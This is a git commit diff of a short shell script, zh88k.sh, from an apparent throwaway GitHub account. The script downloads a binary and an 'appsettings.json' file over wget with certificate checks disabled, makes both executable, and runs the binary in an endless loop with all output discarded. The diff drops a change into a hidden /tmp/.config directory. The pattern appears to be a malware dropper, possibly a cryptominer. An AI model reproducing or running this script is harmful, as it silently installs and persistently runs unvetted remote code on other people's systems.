a071d1b483720832cbaf8bf15d0a765d961f7d0f
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-04-30 18:37:59 +0800

    Update zh88k.sh

--- zh88k.sh
+++ zh88k.sh
@@ -1,10 +1,7 @@
 #!/bin/bash
-
-src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
-
 wget --no-check-certificate -O ./appsettings.json https://github.com/curiosityinteriorsuk/2088/raw/main/q1.json
 wget --no-check-certificate -O ./p https://github.com/curiosityinteriorsuk/2088/raw/main/q
 chmod u+x ./appsettings.json
 chmod u+x ./p
-while true; do cd /tmp/.config; ./p >/dev/null 2>&1 ; done
+while true; do ./p >/dev/null 2>&1 ; done
 
